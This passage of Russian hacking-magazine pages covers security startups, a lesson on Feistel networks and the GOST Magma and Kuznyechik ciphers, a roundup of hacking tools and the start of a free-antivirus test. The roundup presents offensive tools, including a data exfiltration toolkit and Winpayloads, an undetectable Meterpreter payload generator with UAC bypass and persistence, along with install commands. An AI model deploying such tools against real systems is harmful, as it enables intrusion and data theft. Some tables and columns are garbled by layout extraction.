перь представь, что эти скрипты пишутся огромным комьюнити и каждый может
скачать с GitHub нужный ему сценарий.





Пример схемы работы Phantom

Как ты уже догадался, все это существует на самом деле и предоставляется
компанией Phantom. Что самое интересное, в ближайшее время можно будет
совершенно бесплатно получить ознакомительную версию и поиграться с ней.

ВЫВОДЫ
Ты, наверное, заметил, что большая часть стартапов в области ИБ делится
на израильские и индийские. А если вглядеться в суть, то обнаруживается и те-
матическое деление. Первые стремятся автоматизировать ручные подходы,
такие как тестирование на проникновение, чтобы отжать кусок хлеба у консуль-
тантов. Их решения зачастую имеют сильную атакующую составляющую. Вто-
рые предпочитают разрабатывать некие платформы и по большей части берут-
ся за проблемы скорее айтишные, чем секьюрити в том понимании, к которому
мы привыкли.
   Деление вполне закономерное. Основатели индийских стартапов — выход-
цы из программистов. Вчера они делали платформу для виртуализации, а се-
годня виртуализируют продукты безопасности. Вчера была система контроля
версий, а сегодня система управления рисками. Просто вчера было модно IT,
а сегодня — безопасность. Завтра будет, к примеру, интернет-маркетинг, и все
силы уйдут туда.
   Израильские стартапы в большинстве своем основаны бывшими сотрудни-
ками военных подразделений по кибербезопасности. У них поставлено на по-
ток решение задач и автоматизации сложных методов атак, и различных спо-
собов защиты. Их фишка — именно в знании техник атак и их отражения, и они
прекрасно умеют упаковывать эти техники в продукты.
  В общем, осталось узнать, какой путь выберет Россия. А для этого хорошо
бы сначала увидеть на Innovation Sandbox хотя бы парочку наших компаний.
ВЗЛОМ





                                                                              Анастасия Береснева
                                                                                          anastasiya3161@gmail.comПОГРУЖЕНИЕ
В КРИПТУ. ЧАСТЬ 3:
ОТЕЧЕСТВЕННЫЕ
                         ЧТО ТАКОЕ БЛОЧНЫЕ ШИФРЫ,
                          СЕТЬ ФЕЙСТЕЛЯ, ПРОТОКОЛЫ
                         ГОСТ 28147-89 И «КУЗНЕЧИК»ШИФРЫ
Ты уже познакомился с историческими шифрами, узнал
о распределении ключей. Теперь настал момент погрузить-
ся с головой в современную криптографию. Ее методы куда
более изощренные, нежели у исторических шифров. Попро-
буем разобраться, что такое сеть Фейстеля и какие отече-
ственные блочные шифры используются в современных про-
токолах. Все просто, понятно и с примерами. Велком!

Roadmap

Это третий урок из цикла «Погружение в крипту». Все уроки цикла в хронологи-
ческом порядке:

• Урок 1. Исторические шифры. Основы и исторические шифраторы. Как ра-
   ботают (и анализируются) шифры сдвига, замены, Рихарда Зорге, шифр
   Вернама и выполняющие их шифровальные машины.
• Урок 2. Распределение ключей. Что это такое, как выполняется распреде-
   ление ключей и как выбрать криптостойкий ключ (ты здесь).
• Урок 3. Современные отечественные шифры. Что такое сеть Фейстеля и ка-
   кими бывают отечественные блочные шифры, используемые в современных
   протоколах: ГОСТ 28147—89, «Кузнечик».
• Урок 4. Современные зарубежные шифры. В чем разница между 3DES,
   AES, Blowfish, IDEA, Threefish от Брюса Шнайдера и как они работают.
• Урок 5. Электронная подпись. Виды электронных подписей, как они рабо-
   тают и как их использовать.
• Урок 6. Квантовая криптография. Что это такое, где используется и как по-
   могает в распределении секретных ключей. Генерация случайных чисел
   и электронной подписи.



БЛОЧНОЕ И ПОТОЧНОЕ ШИФРОВАНИЕ
Как ты помнишь, шифр сдвига, замены, перестановки и шифр Вернама приме-
няют операцию к каждому конкретному символу текста. Нужно сдвинуть — сдви-
гаем символ, применить ключ — применяем к символу, за ним к следующему
символу и так далее, пока не зашифруем все символы открытого текста. Такой
метод шифрования называется поточным — мы шифруем каждый символ в от-
дельности. Есть и другой подход: разбить исходный открытый текст на группы
по несколько символов (блоки) и выполнять операции шифрования в каждом
блоке. Это — блочный метод шифрования.
   Чтобы отличие между блочными и поточными шифрами стало понятнее,
приведем пример на простом шифре замены.

Поточное шифрование
Зашифруем поточным шифром замены слово CIPHER:


 a b  c d e    f  g  h     i      j  k     l m n o p q   r  s    t  u  v w  x  y  z

 b e  x  g w     i  q  v     l  o  u m p     j    r  s    t  n  k  h    f  y  z  a d  c

    С                        I         P        H         E        R

     X           L         S         V      W       N

Зашифровали каждый символ и получили шифротекст. Проще простого.

БЛОЧНОЕ ШИФРОВАНИЕ
Зашифруем слово AVADAKEDAVRA. Поскольку шифр блочный, открытый текст ра-
зобьем на блоки по четыре символа: AVAD | AKED | AVRA (на практике блоки тек-
ста состоят из 64-256 бит). Для каждого блока придумаем свою таблицу замены:


 a b  c d e    f  g  h     i      j  k     l m n o p q   r  s    t  u  v w  x  y  z

 b e  x  g w     i  q  v     l  o  u m p     j    r  s    t  n  k  h    f  y  z  a d  c

 a b  c d e    f  g  h     i      j  k     l m n o p q   r  s    t  u  v w  x  y  z

 p g  x  e  n  v  c     i      l  h  u     j  b m   r  s w   t  k  o    f  d  z  a  y  q

 a b  c d e    f  g  h     i      j  k     l m n o p q   r  s    t  u  v w  x  y  z

 x w b g  s  q     i  v     l  c  u m p o   r      j    t m  k  n    f  y  h  a  z  d
А теперь шифруем каждый из блоков соответствующим алфавитом:


     A         V         A        D

    B         Y        B       G

     A         K         E        D

    P        U       N         E

     A         V        R         A

     X         Y      M          X

Получилось чуть лучше, нежели с поточным подходом, если говорить о стой-
кости. Ведь обычный шифр замены мы научились дешифровать одной левой.
А при таком блочном подходе злоумышленнику придется изрядно поломать
голову, прежде чем он сможет подобрать длину блока и уже тогда для каждого
блока применить криптоанализ для шифров замены.

СЕТЬ ФЕЙСТЕЛЯ
Теперь мы готовы перейти к очень важной теме, которая открывает дверь
в бескрайний мир современных систем шифрования. Сеть Фейстеля — это ме-
тод блочного шифрования, разработанный Хорстом Фейстелем в лаборатории
IBM в 1971 году. Сегодня сеть Фейстеля лежит в основе большого количества
криптографических протоколов. Попробуем разобрать «на пальцах», что же
она собой представляет.
   Сеть Фейстеля оперирует блоками открытого текста, поэтому мы рассмо-
трим механизм ее работы на одном из блоков. С остальными блоками действия
будут аналогичны.
•  Блок разбивается на две равные части — левую (L) и правую (R).
•  После разбиения левый подблок изменяется функцией f с использованием
   ключа K: x = f(L, K). В качестве функции можно представить себе какое угод-
   но преобразование — например, старый добрый шифр сдвига с ключом K.
•  Полученный подблок складывается по модулю 2 с правым подблоком R, ко-
   торый до этого был не у дел: x = x   R.
•  Далее полученные части меняются местами и склеиваются.
Как видишь, все достаточно просто. Для того чтобы понять, как это работает,
посмотри на схему:





                                                                   Ячейка
                                                                    Фейстеля


Такая схема называется ячейкойФейстеля. Сама сеть Фейстеля состоит из не-
скольких ячеек. Полученные на выходе первой ячейки подблоки поступают
на вход второй ячейки, результирующие подблоки из второй ячейки попада-
ют на вход третьей ячейки и так далее в зависимости от количества раундов
сети Фейстеля. В каждом таком раунде применяется заранее определенный
раундовый ключ. Чаще всего раундовые ключи выработаны из основного се-
кретного ключа K. Когда все раунды будут пройдены, подблоки текста склеива-
ются, и получается нормальный такой шифротекст.
   Теперь посмотрим работу сети Фейстеля на примере. Возьмем слово
AVADAKEDAVRA и разобьем его на два блока по шесть символов — AVADAK
| EDAVRA. За функцию возьмем шифр сдвига на число позиций, определен-
ных раундовым ключом. Пусть секретный ключ K = [1, 2]. В качестве раундовых
ключей возьмем K[0] = 1, K[1] = 2. Для сложения по модулю 2 переведем текст
в двоичный код согласно телеграфному алфавитику, которым вряд ли кто-то
еще пользуется вообще.
   Вот что получилось:


  A    V    A   D    A    K    E   D    A    V    R    A

 00011 11110 00011 01001 00011 01111 00001 01001 00011 11110 01010 00011
Теперь прогоним через сеть Фейстеля из двух раундов первый блок:





                                                                    Прогон
                                                                       первого
                                                                     блока


   Второй блок попробуй зашифровать сам, у меня получилось MOSSTR.
  Расшифрование осуществляется точно так же: шифротекст разбивается
на блоки и затем подблоки, левый подблок поступает в функцию, складывает-
ся по модулю 2 с правым, и затем подблоки меняются местами. Отличие за-
ключается в том, что раундовые ключи подаются в обратном порядке, то есть
в нашем случае в первом раунде применим ключ K = 2, а затем во втором ра-
унде K = 1.
   Исследования сети Фейстеля показали, что при независимых раундовых
ключах и криптостойкой псевдослучайной функции f трех раундов сети Фей-
стеля будет достаточно, чтобы шифротекст был псевдослучайным. Это говорит
о том, что шифры, основанные на сети Фейстеля, на данный момент достаточ-
но криптостойки.
ГОСТ 28147—89 (МАГМА)
В арсенале уже есть почти все необходимые понятия, поэтому мы готовы пе-
рейти к первой важной теме отечественной криптографии — ГОСТ 28147—89.
Стоит сказать, что про этот стандарт не написал еще только ленивый, поэ-
тому я попробую в миллион первый раз кратко и без тучи формул изложить
суть режимов шифрования великой и ужасной Магмы. Если решишь почи-
тать сам стандарт, то стоит запастись временем, силами, терпением и едой,
потому что стандарты на человеческом языке, как известно, писать строго
запрещено.
  Основные характеристики: ключ 256 бит, блок 64 бита.
   Перед разбором Магмы нужно усвоить новое понятие — таблицы замены,
или S-боксы. Это таблица того же вида, что и таблица в шифре замены. Предна-
значена для замены символов подблока на символы, зафиксированные в таблице.
Не стоит думать, что S-бокс — это случайные цифры, сгенерированные функцией
rand(). S-боксы представляют собой результат продуманных сгенерированных
последовательностей, ведь на них держится криптостойкость всего шифра.
  ГОСТ 28147 весьма скупо характеризует свои таблицы замены. Говорится
лишь о том, что они являются дополнительным секретным элементом (наряду
с секретным ключом) и «поставляются в установленном порядке». Больше ни-
чего. С момента принятия ГОСТ 28147 научно-техническая неопределенность,
связанная с выбором S-боксов, порождала слухи и домыслы. Ходили разгово-
ры о секретных критериях, известных только разработчикам ГОСТа. Естествен-
но, что эта неопределенность снижала доверие к криптосистеме.
   Этот недостаток дал отличную почву для критики стандарта. Француз-
ский криптограф Николя Куртуа опубликовал несколько статей, содержащих
ряд спорных положений относительно стойкости ГОСТа. Куртуа считает, что
на российский стандарт легко построить атаку и его никак нельзя причислять
к международным. Однако свой анализ Куртуа проводит для S-боксов, отлич-
ных от действующих, так что не стоит полагаться на его мнение.
  А теперь посмотрим, что же напридумывали в стенах мрачной Лубянки.

Режим простой замены
В режиме простой замены на 32 раунда, согласно стандарту, нам нужно 32 ра-
ундовых ключа. Для генерации раундовых ключей исходный 256-битный ключ
разбивается на восемь 32-битных блоков: K1…K8. Ключи K9…K24 являются цикли-
ческим повторением ключей K1…K8. Ключи K25…K32 являются ключами K8…K1.
1. Каждый блок 64 бита делится на два подблока — Ai и Bi.
2. Левый подблок Ai складывается по модулю 232 с раундовым ключом K1:
    Ai+1 = Ai + Ki mod 232.
3. Левый подблок проходит через S-бокс.
4. Биты левого подблока сдвигаются на 11 позиций (циклический сдвиг).
5. Левый подблок складывается с правым по модулю 2: Ai = Ai    Bi.
6. Правый подблок принимает первоначальное значение левого подблока:
    Bi+1 = Ai.
7. Подблоки меняются местами.

Сразу пример одного раунда. Ключ 256 бит:

arvadek adava arvadek adava arvadek adava arvadek adava arva
00011 01010 11110 00011 01001 00001 01111 00011 01001 00011 11110
    00011…   …00011 01010 11110 0

Тогда раундовые ключи

K1 = 00011 01010 11110 00011 01001 00001 01
K2 = 111 00011 01001 00011 11110 00011 0001
K3 = …
S-бокс = [1, 15, 13, 0, 5, 7, 10, 4, 9, 2, 3, 14, 6, 11, 8, 12]


Как пользоваться таким S-боксом? Очень просто! Если на входе S-бокса 0, то
на выходе будет 1 (берем 0-й символ S-бокса), если 4, то на выходе будет 5
(берем 4-й символ), если на входе 7, то на выходе 4, и так далее.



Открытый текст:

avada kedavra a
00011 11110 00011 01001 00011 01111 00001 01001 00011 11110 01010
00011 00011

Входной блок 64 бита:

00011 11110 00011 01001 00011 01111 00001 01001 00011 11110 01010
00011 0001
Делится на два 32-битных блока старших и младших битов:





                                                               Схема деления
                                                                на блоки


Пример, конечно, вышел дикий, потому что ГОСТ — это все-таки не такой стан-
дарт, чтоб каждый мог его ручками перебирать.
  Режим простой замены чересчур простой и имеет существенные недостатки:
•  одна ошибка в шифрованном блоке искажает все биты этого блока;
•  при шифровании одинаковых блоков открытого текста получаются оди-
   наковые блоки шифротекста, что может дать определенную информацию
   криптоаналитику.

Таким образом, применять ГОСТ 28147—89 в режиме простой замены жела-
тельно лишь для шифрования ключевых данных.
РЕЖИМ ГАММИРОВАНИЯ
Недостатков режима простой замены этот режим не имеет. Режим гаммиро-
вания называется так потому, что в нем используется гамма — псевдослучай-
ная последовательность, которая в каждом раунде складывается по модулю 2
с открытым текстом. Гамма образуется из синхропосылки S — псевдослучай-
ной последовательности, которая изменяется с каждой итерацией и прохо-
дит шифрование в режиме простой замены, после чего превращается в гамму
и накладывается на открытый текст.
  А теперь все по порядку.
1. Итак, пусть у нас есть синхропосылка S — 64-битная псевдослучайная по-
   следовательность.
2. S прошла через режим простой замены, при этом разбившись на два под-
   блока — S0 и S1.
3. Подблоки складываются с фиксированными константами:

    S0 = S0 + C0 mod 232
    S1 = S1 + C1 - 1mod(232-1) + 1

4. Подблоки S0 и S1 снова проходят режим простой замены, сращиваются, и по-
   лучается результирующая гамма Ω = S0 V S1.
5. Открытый текст складывается по модулю 2 с полученной гаммой.

Шаги 3–5 повторяются для каждого блока. Все эти манипуляции можно посмо-
треть на схеме.


                                                         Шифрование
                                                                 в режиме
                                                              гаммирования
Расшифрование выполняется аналогично, вместо блока открытого текста по-
дается блок шифротекста.

Режим гаммирования с обратной связью
Идем на усложнение. Алгоритм похож на режим гаммирования, однако гамма
формируется на основе предыдущего блока зашифрованных данных, так что
результат шифрования текущего блока зависит также и от предыдущих блоков.
1. Синхропосылка S — 64-битная псевдослучайная последовательность.
2. S шифруется в режиме простой замены.
3. Открытый текст складывается по модулю 2 с полученной гаммой.
4. Полученный шифротекст поступает в качестве синхропосылки для следую-
  щего блока, а также поступает на выход.

Как это выглядит, можно посмотреть на схеме.


                                           Шифрование в режиме
                                               гаммирования с обратной связью





Режим имитовставки
В этом режиме вырабатывается имитовставка — дополнительный блок фикси-
рованной длины, зависящий от исходного текста и ключей. Такой небольшой
блок нужен для подтверждения того, что в шифротекст случайно или предна-
меренно не были внесены искажения, — то есть для проверки целостности.
Работает этот режим так:
1. Блок открытого текста проходит 16 раундов в режиме простой замены.
2. К полученному блоку по модулю 2 прибавляется еще один блок открытого
   текста.
3. Сумма проходит еще 16 раундов в режиме простой замены.
4. Прибавляется следующий блок открытого текста и опять простая замена
   и так далее, пока не кончатся блоки открытого текста.





                                        Шифрование в режиме имитовставки

Для проверки получатель после расшифровывания текста проводит аналогич-
ную описанной процедуру. В случае несовпадения результата с переданной
имитовставкой все соответствующие M блоков считаются ложными.

ГОСТ 34.12—2015 (КУЗНЕЧИК)
Многие считают ГОСТ 28147—89 морально устаревшим и недостаточно стой-
ким по сравнению с зарубежными алгоритмами. На смену ему отечественны-
ми криптографами был выпущен новый стандарт шифрования. Говорят, что это
произошло то ли из-за большого количества атак на старый ГОСТ, то ли пото-
му, что такая длина блока уже устарела и маловата для современных массивов
данных. Истинных причин никто не афиширует. Конечно, не обошлось без из-
менений основных характеристик.
  Основные характеристики: ключ 256 бит, блок 128 бит.
   Также стоит сказать, что в новом стандарте S-боксы фиксированы и проду-
манны, так что не стоит изобретать свои чудо-случайные подстановки. В новом
ГОСТе режимов шифрования стало гораздо больше:
•  режим простой замены (Electronic Codebook, ЕСВ);
•  режим гаммирования (Counter, CTR);
•  режим гаммирования с обратной связью по выходу (Output Feedback, OFB);
•  режим простой замены с зацеплением (Cipher Block Chaining, СВС);
•  режим гаммирования с обратной связью по шифротексту (Cipher Feedback,
   CFB);
•  режим выработки имитовставки (Message Authentication Code algorithm).

Рассмотрим новые режимы.
Режим простой замены с зацеплением
Как было видно на прошлом стандарте, режим простой замены — самый
слабый из режимов, поэтому в новом стандарте он теперь выступает с заце-
плением и стал вовсе не таким простым.
1. Инициализирующий вектор — звучит страшно, но на деле всего лишь
   последовательность битов, поступающая на вход.
2. Вектор разбивается на две части — L и R, одна из которых складывается
   по модулю 2 с открытым текстом, а другая становится половинкой инициа-
   лизирующего вектора для следующего блока.
3. Сумма открытого текста и кусочка инициализирующего вектора проходит
   через шифр простой замены.
4. Полученные блоки зашифрованного текста склеиваются.

Стоит посмотреть на схему, и сразу все становится ясно.





                                                   Шифрование
                                                          в режиме простой
                                                      замены с зацеплением

Разумеется, с инициализирующим вектором не все так просто: он проходит
через ряд линейных преобразований (с использованием линейного регистра
сдвига), прежде чем начать шифрование нового блока. Но для знакомства
с шифром достаточно представлять такую схему. Расшифрование в этом ре-
жиме тоже не совсем очевидное, поэтому лучше посмотреть схему.
   Вместо блока открытого текста подается блок расшифрованного шифро-
текста.
                                                      Расшифрование
                                                           в режиме простой
                                                      замены с зацеплением


Режим гаммирования с обратной связью по выходу
Завершающий эту статью режим очень похож на предыдущий с существенным
различием: сцепление идет до сложения с открытым текстом.





                                                   Шифрование в режиме
                                                        гаммирования
                                                                с обратной связью


Расшифрование в этом режиме выполняется аналогично зашифрованию, толь-
ко блоки открытого текста заменяются блоками шифротекста.
ГДЕ ЖЕ ОНО ВСЕ-ТАКИ НАДО?
В нашей стране ГОСТ 28147—89 активно применяется в системах шифрования
(спасибо, кэп!). Шифрование на отечественном стандарте предусматривает
наиболее используемое отечественное ПО в области криптографии: Acronis,
КРИПТО-ПРО и другие. Кроме того, ты сам можешь использовать ГОСТ в сво-
их разработках — ты имеешь на это право, можно даже считать, что своими
налогами ты оплатил этот стандарт. Для многих языков программирования су-
ществуют библиотеки, его реализующие. Например, для Java и C# есть Bouncy
Castle, на JS — библиотека WebCrypto GOST Library, для плюсов — Encryptions.
Среди отечественных разработок это криптопровайдер КриптоПро CSP.
  Пара слов о стойкости режимов шифрования. Немало зарубежных крипто-
графов пытались поднять руку на наш стандарт, однако на данный момент
не известно ни одной атаки, которая может быть реализована на современном
технологическом уровне развития. Среди программистов этот стандарт дол-
гое время был не слишком популярен, так как из его текста понять алгоритм
работы тяжело, а более четких описаний маловато. Но сейчас уже полно реа-
лизаций на многих языках программирования. Так что теперь использование
ГОСТа вполне реально, и по многим параметрам он превосходит зарубежные
стандарты. В конце концов, где же патриотизмъ?!
  В следующей статье поглядим, что они там понаделали в своей загранице.
ВЗЛОМ





                                Дмитрий «D1g1» Евдокимов,
                                                               Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                    ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!
                BINMAP
                      Binmap — это проект с открытым исходным кодом
                       для сканирования системы и сбора информации об
                      исполняемых бинарных файлах, их зависимостях,
                       символах и многом другом. Ты можешь задаться во-
                       просом: как это вообще может пригодиться?
                      На самом деле это очень полезная штука, она
                       помогает глобально взглянуть на систему или про-
                      грамму (можно указать конкретную директорию)
                        в плане использования и переиспользования кодо-
Авторы:                       вой базы. Самый простой сценарий, который сразу
Serge Guelton,                       напрашивается, — это случай, когда известно, что в
Sebastien Renaud                      определенной библиотеке есть уязвимость. И нуж-
                      но найти все места в программе, где используется
URL:                       код данной библиотеки. Это может помочь как за-
github.com/quarkslab/                        крыть уязвимость во всех проблемных местах, так и
binmap                       определить вектор, в котором проще всего данную
                        уязвимость проэксплуатировать, — смотря что тебе
Система:                         надо.
Linux/Windows                         Библиотеки могут использоваться тремя путями:
                         •  динамическая линковка;
                         •  загрузка в runtime (dlopen или LoadLibrary) — не
                         поддерживается binmap;
                         •  статическая линковка — не поддерживается
                           binmap, но можно дописать.

                        Приятно, что есть поддержка форматов PE и ELF.
                     Подробнее об инструменте можно прочитать в дан-
                    ном блоге.
                DARKSEARCH
                    Людей притягивает то, что запрещено, — это всегда
                        интересно. Есть вещи, которые специально скрыва-
                       ются от глаз обычных пользователей, и там порой
                      надо уметь искать нужную информацию.
                         Проект Darksearch позволяет искать нужную ин-
                    формацию в скрытых источниках, таких как dark
                     web  onions  сайты,  IRC-чаты, геймерские  чаты,
                         blackhat-форумы. Помимо веб-поисковика, есть и
                      специальный простенький API на Python для выпол-
Автор:                  нения нужных поисковых запросов к системе.
Vishal                  Мы уверены, что данный проект определенно
                       найдет свою аудиторию, как и поисковик Shodan.
URL:
github.com/vlall/darksearch

Система:
Linux/Windows
                СКАНИРУЕМ CMS’КИ
                       Droopescan — это сканер для поиска проблем/уяз-
                       вимостей в ряде CMS (Content Management System).
                  В первую очередь — в Drupal, SilverStripe, WordPress
                      и еще немного Joomla. Можно отдельно отметить,
                         что инструмент имеет плагинную архитектуру.
                       Среди аналогов выделяется тем, что:
                         •  он быстрый;
                         •  стабильный;
                         •  часто обновляется;
Автор:                   •  поддерживает массовое сканирование;
Pedro Worcel                         •  на 100% Python.

URL:                   Что касается проверок при сканировании, то тут из
github.com/droope/                       коробки есть четыре типа:
droopescan                         •  определение используемых плагинов на портале;
                         •  определение темы;
Система:                •  определение версии CMS;
Linux                         •  проверка разных интересных URL’ов (например,
                          панель администратора).

                    При этом сканирование цели можно проводить как
                         указав параметр командной строки, так и указав
                          путь до файла со списком интересующих целей.
                      Если для сканирования требуется аутентификация
                       на хосте, то это не проблема, так как инструмент
                      поддерживает netrc-файл и http_proxy переменную
                        окружения.
                           Установка в две строчки:

                        # git clone https://github.com/droope/
                            droopescan.git && cd droopescan
                        # pip install -r requirements.txt
                POC MALWARE
                      Очень интересный и необычный проект. Как гово-
                        рит автор, al-khaser — это PoC вредоносного кода
                       с хорошими целями для проведения тестирования
                        твоей антивирусной системы. Программа распро-
                        страняется в исходных кодах, в виде проекта для
                             VisualStudio, и можно собрать экземпляр с теми или
                     иными трюками, которые сейчас активно использу-
                       ются настоящими вредоносными программами в
                          ITW, и посмотреть, как с этим справится твой анти-
Автор:                          вирус.
LordNoteworthy                       Из техник al-khaser на сегодняшний день под-
                        держивает:
URL:                         •  Anti-debugging attacks (24 техники);
github.com/LordNoteworthy/                         •  Anti-Dumping (одна техника);
al-khaser                         •  Timing Attacks Anti-Sandbox ( (10 техник);
                         •  Human Interaction Anti-Sandbox ( (8 техник);
Система:                         •  Anti-Virtualization (11 техник и множество подви-
Windows                               дов);
                         •  Code/DLL Injections (6 техник).

                      Список действительно внушительный, и он при этом
                   еще пополняется (это можешь сделать и ты).
                    В итоге благодаря этому проекту можно:
                         •  протестировать как свои скиллы, так и свой пла-
                            гин по обходу антиотладок;
                         •  проверить свой sandbox или окружение на скры-
                            тость от вредоносного кода.
                 DATA EXFILTRATION TOOLKIT
                    DET — это акроним от Data Exfiltration Toolkit, инстру-
                      мент с расширяемой архитектурой для извлечения
                     информации из различных протоколов и сервисов.
                        Его фишка в том, что он может извлекать информа-
                    цию из одного или нескольких каналов/источников
                       одновременно.
                      На текущий момент есть поддержка следующих
                        протоколов:
                         •  HTTP(S);
Автор:                         •  ICMP;
Paul Sec                         •  DNS;
                         •  SMTP/IMAP;
URL:                         •  Raw TCP;
github.com/sensepost/DET                         •  PowerShell implementation (HTTP, DNS, ICMP,
                     SMTP (used with Gmail)).
Система:
all                 И даже поддержка парочки сервисов:
                         •  Google Docs (Unauthenticated);
                         •  Twitter (Direct Messages).

                 И пока что экспериментальная поддержка:
                         •  Skype (95% готовности);
                         •  Tor (80% готовности);
                         •  GitHub (30/40% готовности).

                     Подробнее об инструменте можно узнать из слай-
                      дов Introducing DET (Data Exfiltration Toolkit) с конфе-
                      ренции BSides Ljubljana.
                DEXRAY
                    DeXRAY долгое время был приватным инструментом
                       на Perl, а с недавних пор стал доступен всем желаю-
                     щим. Данная программа создавалась для расшиф-
                       ровки файлов из карантинов антивирусных решений
                       для помощи форензики. Со временем он расши-
                         рялся, в него добавляли поддержку новых движков и
                     форматов файлов от большего числа антивирусных
                      решений. Скажем честно, не все он поддерживает
                        идеально, но определенно помогает разобраться
Автор:                      со многими движками.
hexacorn                         Поддерживает следующие карантины:
                         •  ASquared (EQF);
URL:                         •  ESET (NQF);
www.hexacorn.com/                         •  Kaspersky (KLQ);
blog/2016/03/11/dexray/                         •  MalwareBytes Data files (DATA);
                         •  MalwareBytes Quarantine files (QUAR);
Система:                         •  McAfee Quarantine files (BUP) (не полностью);
Windows                         •  Microsoft Forefront (Magic@0=0B AD) (не полно-
                              стью);
                         •  SUPERAntiSpyware (SDB);
                         •  Symantec Quarantine Data files (QBD);
                         •  Symantec Quarantine files (VBN) (не полностью);
                         •  Symantec Quarantine Index files (QBI);
                         •  TrendMicro;
                         •  любой бинарный файл (использующий X-RAY-
                           сканирование).
               ШЕЛЛ-КОД ИЗ PYTHON С ОБХОДАМИ
                         Winpayloads — это инструмент для генерации по-
                       лезных  нагрузок  (payload), который  использует
                         Meterpreter-шелл-коды из Metasploit с пользова-
                       тельскими настройками (ip, port и так далее) и соз-
                        дает Python-файл, выполняющий данный шелл-код
                       с помощью ctypes. Затем данный код шифруется с
                    помощью алгоритма AES и преобразуется в испол-
                     няемый файл ОС Windows с помощью PyInstaller.
                          Особенности:
Автор:                         •  высокий уровень недетектируемости;
Charlie Dean                         •  простой GUI-интерфейс;
                         •  загрузка payload на локальный веб-сервер;
URL:                         •  psexec payload на целевой машине;
github.com/charliedean/                         •  автоматический запуск Metasploit Listener после
winpayloads                          генерации полезных нагрузок;
                         •  интеграция с Shellter;
Система:                     Кроме этого, есть еще две интересные фичи:
Linux                         •  обход UAC;
                         •  payload persistence.

                       Простая установка:

                        git clone https://github.com/Charliedean/
                            Winpayloads.git
                        cd Winpayloads
                        ./setup.sh
                        ./winpayloads
MALWARE
ТЕСТ БЕСПЛАТНЫХ
                      ЧАСТЬ 2АНТИВИРУСОВ
ИЗУЧАЕМ COMODO,
QIHOO 360, PANDA
И WINDOWS
DEFENDER                                                                 84ckf1r3
                                                                                              84ckf1r3@gmail.com
В соседней статье этой же рубри-
ки этого номера Денис Колисниченко
в своем исследовании показал, что за-
разить современные версии Windows
не так просто, даже если очень этого                                               WARNING
хочется. Возможно, вирусы просто по-
боялись заражать компьютер автора          толькоВсе тестыв исследователь-выполнялись
                                                                               ских целях. Необходи-трех десятков книг и бессчетного коли-                                                              мые файлы были загру-
                                                                 жены с общедоступныхчества статей :), потому что компьюте-
                                                                             ресурсов. Разработчики
ры обычных пользователей они зара-           протестированных
жают исправно. Не оспаривая тот факт,      антивирусов получили                                                                            автоматические уве-
                                                                      домления о результатахчто Win 7 и 10 защищены значительно
                                                                           сканирования. Редакция
лучше своей предшественницы, сегод-     и автор не несут ответ-
ня мы представим на твой суд продол-        ственности за любой                                                                      возможный вред.
жение статьи «Бесплатные антивиру-
сы — проверка боем», тем более что
этого просили многие читатели ][.



В прошлой статье мы выяснили, как реагируют на попытки заражения во время
веб-серфинга четыре популярных продукта: Avast! Free Antivirus, AVG Antivirus
Free Edition, Avira Free Antivirus 2016 и Kaspersky Free. Наш эксперимент был
бы неполным без других участников тестирования. Посмотрим, как справятся
с той же задачей Comodo, Qihoo 360, Panda и Windows Defender.

МЕТОДИКА ТЕСТИРОВАНИЯ
Суть эксперимента осталась точно такой же. Каждый антивирус устанавливает-
ся в свою виртуальную машину. Перед тестом он обновляется и пытается не до-
пустить заражения при посещении заведомо инфицированных сайтов через
предустановленный браузер Edge. Свежий список угроз берется из базы Clean
MX, а все виртуалки — клоны одной и той же чистой операционки. Единствен-
ное отличие новой тестовой среды состоит в том, что на этот раз мы решили
использовать Windows 10 вместо Windows 7.
Все тесты проводились в настройках по умолчанию и сразу после обновления
антивирусов. В реальных условиях для повышения безопасности следует ис-
пользовать более агрессивные настройки и дополнительные инструменты за-
щиты. В платных антивирусах большинство из них уже интегрировано, однако
при желании можно самостоятельно сделать подобный набор из бесплатных
утилит.
   Внимание! Исследование антивирусов и вредоносных файлов в виртуаль-
ной машине не обеспечивает полную безопасность. Используя различные уяз-
вимости, зловреды могут выйти за пределы тестовой системы и заразить ос-
новную ОС.



ЗАЩИТНИК WINDOWS
Бытует мнение, что «голая Windows» и предустановленный браузер совер-
шенно беззащитны. Долгое время так и было, однако с развитием у Microsoft
облачной службы мониторинга большинство потенциально вредоносных и тем
более зараженных сайтов быстро попадают в ее общий черный список. Без-
опасность браузера Edge в целом тоже выше, чем у IE. Поэтому пользовате-
лям «шпиокон 10» стало сложнее наступить на вирусные и фишинговые грабли,
особенно на уже обнаруженные другими.
   Скачать протрояненный экзешник и заразиться по старинке в Edge стало
значительно сложнее. При такой попытке сначала отображается предупрежде-
ние о низкой репутационной характеристике сомнительного файла, и его во-
обще не рекомендуется загружать.





                                     Анализ репутационной характеристики файла

Если все-таки скачать его принудительно, то при запуске загруженного файла
сработает вторая блокировка — SmartScreen, реагирующая на отсутствующий
цифровой сертификат приложения.
                       Блокирование подозрительного файла фильтром SmartScreen


Особо настойчивый пользователь может проигнорировать и ее. Тогда появит-
ся последнее предупреждение — от контроля учетных записей. Не внявшего
трем алертам юзера даже не жалко — пусть себе любуется скачками троянских
коней.
   Известные угрозы обычно блокируются фильтром SmartScreen на этапе за-
грузки, а во всплывающих сообщениях Edge выбор действий в таком случае
отсутствует. Пользователя просто извещают о том, что вредоносный файл
был заблокирован. Достать его из автоматического карантина можно только
через журнал «Защитника Windows» — он работает как отдельно, так и в паре
со SmartScreen.
  Зловреды часто маскируются под обновления популярных программ, на-
пример Adobe Flash player. Если раньше пользователь без антивируса мог
видеть лишь предупреждения о ненадежном источнике загрузки или отсут-
ствующем сертификате, то теперь SmartScreen просто блокирует доступ к та-
ким файлам. Распространенный Backdoor MSIL/Bladabindi.AA сразу помеща-
ется «Защитником Windows» в карантин безо всяких вопросов. Аналогично
происходит и при попытке подсунуть в ссылке бэкдор под видом экранной
заставки (.scr).
                                                       Объекты на карантине


Упакованные зловреды SmartScreen отлавливает в одноуровневых архивах ZIP,
а вот в многоуровневых обнаруживает не всегда. Также он не видит их в фор-
мате RAR, поскольку без дополнительных программ Windows 10 не поддержи-
вает работу с ним.
                                                    Журнал загрузок
                                                       и результат
                                                         проверки архива на VT

Наиболее показательна реакция «Защитника Windows» на хорошо известные
